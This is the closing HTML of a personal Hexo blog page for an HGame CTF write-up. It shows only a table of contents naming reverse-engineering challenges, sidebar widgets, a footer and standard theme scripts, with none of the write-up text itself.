        <a class="is-flex" href="#欢迎参加HGame！">
        <span class="has-mr-6">1.5.1</span>
        <span>欢迎参加HGame！</span>
        </a></li><li>
        <a class="is-flex" href="#壁纸">
        <span class="has-mr-6">1.5.2</span>
        <span>壁纸</span>
        </a></li><li>
        <a class="is-flex" href="#签到题ProPlus">
        <span class="has-mr-6">1.5.3</span>
        <span>签到题ProPlus</span>
        </a></li></ul></li></ul></li><li>
        <a class="is-flex" href="#Week2">
        <span class="has-mr-6">2</span>
        <span>Week2</span>
        </a><ul class="menu-list"><li>
        <a class="is-flex" href="#RE-1">
        <span class="has-mr-6">2.1</span>
        <span>RE</span>
        </a><ul class="menu-list"><li>
        <a class="is-flex" href="#unpack">
        <span class="has-mr-6">2.1.1</span>
        <span>unpack</span>
        </a></li><li>
        <a class="is-flex" href="#Classic-CrackMe">
        <span class="has-mr-6">2.1.2</span>
        <span>Classic_CrackMe</span>
        </a></li><li>
        <a class="is-flex" href="#babyPy">
        <span class="has-mr-6">2.1.3</span>
        <span>babyPy</span>
        </a></li></ul></li></ul></li></ul>
            </div>
        </div>
    </div>

    
        <div class="card widget">
    <div class="card-content">
        <div class="menu">
        <h3 class="menu-label">
            Links
        </h3>
        <ul class="menu-list">
        
            <li>
                <a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener">
                    <span class="level-left">
                        <span class="level-item">Hexo</span>
                    </span>
                    <span class="level-right">
                        <span class="level-item tag">hexo.io</span>
                    </span>
                </a>
            </li>
        
            <li>
                <a class="level is-mobile" href="https://github.com/ppoffice" target="_blank" rel="noopener">
                    <span class="level-left">
                        <span class="level-item">PPOffice</span>
                    </span>
                    <span class="level-right">
                        <span class="level-item tag">github.com</span>
                    </span>
                </a>
            </li>
        
        </ul>
        </div>
    </div>
</div>

    
        
<div class="card widget">
    <div class="card-content">
        <div class="menu">
            <h3 class="menu-label">
                Categories
            </h3>
            <ul class="menu-list">
            
            </ul>
        </div>
    </div>
</div>
    
        <div class="card widget">
    <div class="card-content">
        <h3 class="menu-label">
            Tag Cloud
        </h3>
        <a href="/tags/BUUCTF/" style="font-size: 10px;">BUUCTF</a> <a href="/tags/CG-CTF/" style="font-size: 10px;">CG-CTF</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/bugku/" style="font-size: 10px;">bugku</a> <a href="/tags/hgame/" style="font-size: 10px;">hgame</a> <a href="/tags/re/" style="font-size: 20px;">re</a> <a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 10px;">攻防世界</a>
    </div>
</div>
    
    
        <div class="column-right-shadow is-hidden-widescreen ">
        
            <div class="card widget">
    <div class="card-content">
        <h3 class="menu-label">
            Recent
        </h3>
        
        <article class="media">
            
            <a href="/2020/01/25/hgame-wp/" class="media-left">
                <p class="image is-64x64">
                    <img class="thumbnail" src="/images/thumbnail.svg" alt="hgame_wp">
                </p>
            </a>
            
            <div class="media-content">
                <div class="content">
                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-01-25T12:28:09.000Z">2020-01-25</time></div>
                    <a href="/2020/01/25/hgame-wp/" class="title has-link-black-ter is-size-6 has-text-weight-normal">hgame_wp</a>
                    <p class="is-size-7 is-uppercase">
                        
                    </p>
                </div>
            </div>
        </article>
        
        <article class="media">
            
            <a href="/2020/01/11/bugku-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="media-left">
                <p class="image is-64x64">
                    <img class="thumbnail" src="/images/thumbnail.svg" alt="bugku-re部分题解">
                </p>
            </a>
            
            <div class="media-content">
                <div class="content">
                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-01-11T07:31:43.000Z">2020-01-11</time></div>
                    <a href="/2020/01/11/bugku-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="title has-link-black-ter is-size-6 has-text-weight-normal">bugku-re部分题解</a>
                    <p class="is-size-7 is-uppercase">
                        
                    </p>
                </div>
            </div>
        </article>
        
        <article class="media">
            
            <a href="/2020/01/11/CGCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="media-left">
                <p class="image is-64x64">
                    <img class="thumbnail" src="/images/thumbnail.svg" alt="CGCTF-re部分题解">
                </p>
            </a>
            
            <div class="media-content">
                <div class="content">
                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-01-11T07:31:43.000Z">2020-01-11</time></div>
                    <a href="/2020/01/11/CGCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="title has-link-black-ter is-size-6 has-text-weight-normal">CGCTF-re部分题解</a>
                    <p class="is-size-7 is-uppercase">
                        
                    </p>
                </div>
            </div>
        </article>
        
        <article class="media">
            
            <a href="/2020/01/11/BUUCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="media-left">
                <p class="image is-64x64">
                    <img class="thumbnail" src="/images/thumbnail.svg" alt="BUUCTF-re部分题解">
                </p>
            </a>
            
            <div class="media-content">
                <div class="content">
                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-01-11T07:31:43.000Z">2020-01-11</time></div>
                    <a href="/2020/01/11/BUUCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="title has-link-black-ter is-size-6 has-text-weight-normal">BUUCTF-re部分题解</a>
                    <p class="is-size-7 is-uppercase">
                        
                    </p>
                </div>
            </div>
        </article>
        
        <article class="media">
            
            <a href="/2020/01/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="media-left">
                <p class="image is-64x64">
                    <img class="thumbnail" src="/images/thumbnail.svg" alt="攻防世界-re部分题解">
                </p>
            </a>
            
            <div class="media-content">
                <div class="content">
                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-01-11T07:31:43.000Z">2020-01-11</time></div>
                    <a href="/2020/01/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="title has-link-black-ter is-size-6 has-text-weight-normal">攻防世界-re部分题解</a>
                    <p class="is-size-7 is-uppercase">
                        
                    </p>
                </div>
            </div>
        </article>
        
    </div>
</div>
        
            <div class="card widget">
    <div class="card-content">
        <div class="menu">
        <h3 class="menu-label">
            Archives
        </h3>
        <ul class="menu-list">
        
        <li>
            <a class="level is-marginless" href="/archives/2020/01/">
                <span class="level-start">
                    <span class="level-item">January 2020</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">5</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2019/12/">
                <span class="level-start">
                    <span class="level-item">December 2019</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">1</span>
                </span>
            </a>
        </li>
        
        </ul>
        </div>
    </div>
</div>
        
            <div class="card widget">
    <div class="card-content">
        <div class="menu">
            <h3 class="menu-label">
                Tags
            </h3>
            <div class="field is-grouped is-grouped-multiline">
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/BUUCTF/">
                        <span class="tag">BUUCTF</span>
                        <span class="tag is-grey">1</span>
                    </a>
                </div>
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/CG-CTF/">
                        <span class="tag">CG-CTF</span>
                        <span class="tag is-grey">1</span>
                    </a>
                </div>
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/CTF/">
                        <span class="tag">CTF</span>
                        <span class="tag is-grey">5</span>
                    </a>
                </div>
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/bugku/">
                        <span class="tag">bugku</span>
                        <span class="tag is-grey">1</span>
                    </a>
                </div>
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/hgame/">
                        <span class="tag">hgame</span>
                        <span class="tag is-grey">1</span>
                    </a>
                </div>
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/re/">
                        <span class="tag">re</span>
                        <span class="tag is-grey">5</span>
                    </a>
                </div>
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">
                        <span class="tag">攻防世界</span>
                        <span class="tag is-grey">1</span>
                    </a>
                </div>
                
            </div>
        </div>
    </div>
</div>
        
        </div>
    
</div>

                




<div class="column is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only has-order-3 column-right ">
    
        <div class="card widget">
    <div class="card-content">
        <h3 class="menu-label">
            Recent
        </h3>
        
        <article class="media">
            
            <a href="/2020/01/25/hgame-wp/" class="media-left">
                <p class="image is-64x64">
                    <img class="thumbnail" src="/images/thumbnail.svg" alt="hgame_wp">
                </p>
            </a>
            
            <div class="media-content">
                <div class="content">
                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-01-25T12:28:09.000Z">2020-01-25</time></div>
                    <a href="/2020/01/25/hgame-wp/" class="title has-link-black-ter is-size-6 has-text-weight-normal">hgame_wp</a>
                    <p class="is-size-7 is-uppercase">
                        
                    </p>
                </div>
            </div>
        </article>
        
        <article class="media">
            
            <a href="/2020/01/11/bugku-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="media-left">
                <p class="image is-64x64">
                    <img class="thumbnail" src="/images/thumbnail.svg" alt="bugku-re部分题解">
                </p>
            </a>
            
            <div class="media-content">
                <div class="content">
                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-01-11T07:31:43.000Z">2020-01-11</time></div>
                    <a href="/2020/01/11/bugku-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="title has-link-black-ter is-size-6 has-text-weight-normal">bugku-re部分题解</a>
                    <p class="is-size-7 is-uppercase">
                        
                    </p>
                </div>
            </div>
        </article>
        
        <article class="media">
            
            <a href="/2020/01/11/CGCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="media-left">
                <p class="image is-64x64">
                    <img class="thumbnail" src="/images/thumbnail.svg" alt="CGCTF-re部分题解">
                </p>
            </a>
            
            <div class="media-content">
                <div class="content">
                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-01-11T07:31:43.000Z">2020-01-11</time></div>
                    <a href="/2020/01/11/CGCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="title has-link-black-ter is-size-6 has-text-weight-normal">CGCTF-re部分题解</a>
                    <p class="is-size-7 is-uppercase">
                        
                    </p>
                </div>
            </div>
        </article>
        
        <article class="media">
            
            <a href="/2020/01/11/BUUCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="media-left">
                <p class="image is-64x64">
                    <img class="thumbnail" src="/images/thumbnail.svg" alt="BUUCTF-re部分题解">
                </p>
            </a>
            
            <div class="media-content">
                <div class="content">
                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-01-11T07:31:43.000Z">2020-01-11</time></div>
                    <a href="/2020/01/11/BUUCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="title has-link-black-ter is-size-6 has-text-weight-normal">BUUCTF-re部分题解</a>
                    <p class="is-size-7 is-uppercase">
                        
                    </p>
                </div>
            </div>
        </article>
        
        <article class="media">
            
            <a href="/2020/01/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="media-left">
                <p class="image is-64x64">
                    <img class="thumbnail" src="/images/thumbnail.svg" alt="攻防世界-re部分题解">
                </p>
            </a>
            
            <div class="media-content">
                <div class="content">
                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-01-11T07:31:43.000Z">2020-01-11</time></div>
                    <a href="/2020/01/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="title has-link-black-ter is-size-6 has-text-weight-normal">攻防世界-re部分题解</a>
                    <p class="is-size-7 is-uppercase">
                        
                    </p>
                </div>
            </div>
        </article>
        
    </div>
</div>
    
        <div class="card widget">
    <div class="card-content">
        <div class="menu">
        <h3 class="menu-label">
            Archives
        </h3>
        <ul class="menu-list">
        
        <li>
            <a class="level is-marginless" href="/archives/2020/01/">
                <span class="level-start">
                    <span class="level-item">January 2020</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">5</span>
                </span>
            </a>
        </li>
        
        <li>
            <a class="level is-marginless" href="/archives/2019/12/">
                <span class="level-start">
                    <span class="level-item">December 2019</span>
                </span>
                <span class="level-end">
                    <span class="level-item tag">1</span>
                </span>
            </a>
        </li>
        
        </ul>
        </div>
    </div>
</div>
    
        <div class="card widget">
    <div class="card-content">
        <div class="menu">
            <h3 class="menu-label">
                Tags
            </h3>
            <div class="field is-grouped is-grouped-multiline">
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/BUUCTF/">
                        <span class="tag">BUUCTF</span>
                        <span class="tag is-grey">1</span>
                    </a>
                </div>
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/CG-CTF/">
                        <span class="tag">CG-CTF</span>
                        <span class="tag is-grey">1</span>
                    </a>
                </div>
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/CTF/">
                        <span class="tag">CTF</span>
                        <span class="tag is-grey">5</span>
                    </a>
                </div>
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/bugku/">
                        <span class="tag">bugku</span>
                        <span class="tag is-grey">1</span>
                    </a>
                </div>
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/hgame/">
                        <span class="tag">hgame</span>
                        <span class="tag is-grey">1</span>
                    </a>
                </div>
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/re/">
                        <span class="tag">re</span>
                        <span class="tag is-grey">5</span>
                    </a>
                </div>
                
                <div class="control">
                    <a class="tags has-addons" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">
                        <span class="tag">攻防世界</span>
                        <span class="tag is-grey">1</span>
                    </a>
                </div>
                
            </div>
        </div>
    </div>
</div>
    
    
</div>

            </div>
        </div>
    </section>
    <footer class="footer">
    <div class="container">
        <div class="level">
            <div class="level-start has-text-centered-mobile">
                <a class="footer-logo is-block has-mb-6" href="/">
                
                    <img src="/images/logo.svg" alt="hgame_wp" height="28">
                
                </a>
                <p class="is-size-7">
                &copy; 2020 Aorui Zhang&nbsp;
                Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> & <a
                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a>
                
                </p>
            </div>
            <div class="level-end">
            
                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
                
                <p class="control">
                    <a class="button is-white is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/">
                        
                        <i class="fab fa-creative-commons"></i>
                        
                    </a>
                </p>
                
                <p class="control">
                    <a class="button is-white is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
                        
                        <i class="fab fa-creative-commons-by"></i>
                        
                    </a>
                </p>
                
                <p class="control">
                    <a class="button is-white is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus">
                        
                        <i class="fab fa-github"></i>
                        
                    </a>
                </p>
                
                </div>
            
            </div>
        </div>
    </div>
</footer>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
<script>moment.locale("en");</script>


<script>
var IcarusThemeSettings = {
    site: {
        url: 'https://rycbar.xyz',
        external_link: {"enable":true,"exclude":[]}
    },
    article: {
        highlight: {
            clipboard: true,
            fold: 'unfolded'
        }
    }
};
</script>


<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>





<script src="/js/animation.js"></script>



<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
<script src="/js/gallery.js" defer></script>



<div id="outdated">
    <h6>Your browser is out-of-date!</h6>
    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
            my browser now </a></p>
    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
</div>
<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
<script>
    document.addEventListener("DOMContentLoaded", function () {
        outdatedBrowser({
            bgColor: '#f25648',
            color: '#ffffff',
            lowerThan: 'flex'
        });
    });
</script>


<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    MathJax.Hub.Config({
        'HTML-CSS': {
            matchFontHeight: false
        },
        SVG: {
            matchFontHeight: false
        },
        CommonHTML: {
            matchFontHeight: false
        },
        tex2jax: {
            inlineMath: [
                ['$','$'],
                ['\\(','\\)']
            ]
        }
    });
});
</script>


<a id="back-to-top" title="Back to Top" href="javascript:;">
    <i class="fas fa-chevron-up"></i>
</a>
<script src="/js/back-to-top.js" defer></script>














<script src="/js/main.js" defer></script>

    
    <div class="searchbox ins-search">
    <div class="searchbox-container ins-search-container">
        <div class="searchbox-input-wrapper">
            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="searchbox-result-wrapper ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
    (function (window) {
        var INSIGHT_CONFIG = {
            TRANSLATION: {
                POSTS: 'Posts',
                PAGES: 'Pages',
                CATEGORIES: 'Categories',
                TAGS: 'Tags',
                UNTITLED: '(Untitled)',
            },
            CONTENT_URL: '/content.json',
        };
        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
    })(window);
</script>
<script src="/js/insight.js" defer></script>
<link rel="stylesheet" href="/css/search.css">
<link rel="stylesheet" href="/css/insight.css">
    
</body>
</html>